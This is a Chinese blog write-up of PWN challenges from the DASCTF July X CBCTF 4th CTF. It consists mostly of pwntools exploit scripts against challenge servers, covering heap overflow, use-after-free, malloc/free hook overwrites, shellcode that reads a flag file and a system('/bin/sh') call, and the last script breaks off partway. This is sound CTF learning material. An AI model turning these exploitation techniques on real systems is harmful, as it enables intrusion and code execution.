@@ -1,0 +1,259 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>DASCTF July X CBCTF 4th PWN WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加"><meta property="og:image" content><meta property="og:title" content="DASCTF July X CBCTF 4th PWN WP"><meta property="og:description" content="周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1508.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-02T22:13:00+00:00"><meta property="article:modified_time" content="2021-08-02T22:13:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="DASCTF July X CBCTF 4th PWN WP"><meta name=twitter:description content="周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>DASCTF July X CBCTF 4th PWN WP</h1><div class=meta>Posted on Aug 2, 2021</div></div><section class=body><p>周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加上决赛似乎主要是渗透测试相关的，本来也不是很相关。UIUCTF 感觉质量还挺高的，后来看好像还有专门的 kernel 题，正好这段时间学 kernel 其实挺值得打一下的，但是打完了 DASCTF 才发现有这比赛，所以也错过了。</p><p>DASCTF PWN 题的质量不高，难度不高，也没什么新意，不想多说什么。这边就只放下 EXP 了。</p><h3 id=easyheap>EasyHeap</h3><p>由 strdup 造成的简单堆溢出</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./Easyheap&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node4.buuoj.cn&#34;</span>, <span style=color:#40a070>27695</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>)
+</span></span><span style=display:flex><span>bss_base <span style=color:#666>=</span> <span style=color:#40a070>0x23330000</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(size, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size: </span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Content: </span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(idx, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Content:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx:0</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x410</span>) <span style=color:#60a0b0;font-style:italic># idx:1</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx:2</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx:3</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>) <span style=color:#60a0b0;font-style:italic># idx:4</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>) <span style=color:#60a0b0;font-style:italic># idx:5</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>edit(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>0x60</span>
+</span></span><span style=display:flex><span>__malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x23330000</span>))
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 1</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x410</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>open(<span style=color:#4070a0>&#39;./flag&#39;</span>)) 
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>read(<span style=color:#40a070>3</span>,bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>,<span style=color:#40a070>0x60</span>))
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>write(<span style=color:#40a070>1</span>,bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>,<span style=color:#40a070>0x60</span>))
+</span></span><span style=display:flex><span>edit(<span style=color:#40a070>3</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>5</span>)
+</span></span><span style=display:flex><span>edit(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x31</span>) <span style=color:#666>+</span> p64(__malloc_hook))
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>) <span style=color:#60a0b0;font-style:italic># idx:5</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>) <span style=color:#60a0b0;font-style:italic># idx:6</span>
+</span></span><span style=display:flex><span>edit(<span style=color:#40a070>6</span>, p64(bss_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=realnooutput>realNoOutput</h3><p>由数组越界可以造成 edit 中的未初始化指针引用，从而实现 UAF</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./realNoOutput_p&#34;)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./realNoOutput&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node4.buuoj.cn&#34;</span>, <span style=color:#40a070>29005</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(idx, size, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(idx, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>8</span>):
+</span></span><span style=display:flex><span>    add(i, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>8</span>):
+</span></span><span style=display:flex><span>    delete(<span style=color:#40a070>7</span> <span style=color:#666>-</span> i)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#for i in range(7):</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#    add(i, 0x100, &#39;aaaaaaaa&#39;)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>7</span>, <span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;aaaabbbb&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sleep(<span style=color:#40a070>0.2</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>7</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;aaaabbbb&#39;</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x170</span>
+</span></span><span style=display:flex><span>__free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span>__malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>8</span>, <span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>3</span>, <span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>4</span>, <span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>4</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;__free_hook: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(__free_hook))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;system: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(system))
+</span></span><span style=display:flex><span>edit(<span style=color:#40a070>0</span>, p64(__free_hook))
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#add(3, 0x8, &#39;a&#39; * 8)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#add(4, 0x8, &#39;a&#39; * 8)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#add(5, 0x8, &#39;a&#39; * 8)</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>4</span>, <span style=color:#40a070>0x18</span>, p64(system) <span style=color:#666>*</span> <span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>5</span>, <span style=color:#40a070>0x18</span>, p64(system) <span style=color:#666>*</span> <span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=old_thing>old_thing</h3><p>爆破 &lsquo;\x00&rsquo; 开头的 md5 原值，然后 ROP 即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./canary3&#34;)</span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./canary3&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node4.buuoj.cn&#34;</span>,<span style=color:#4070a0>&#34;26823&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;username:&#34;</span>, <span style=color:#4070a0>&#39;admin&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;password:&#34;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x3d\xfd\xff\xff</span><span style=color:#4070a0>&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#39;your input:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x8</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x8</span>)
+</span></span><span style=display:flex><span>prog_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0xA20</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;prog_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(prog_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#39;your input:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x8</span> <span style=color:#666>*</span> <span style=color:#40a070>3</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;-&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>)
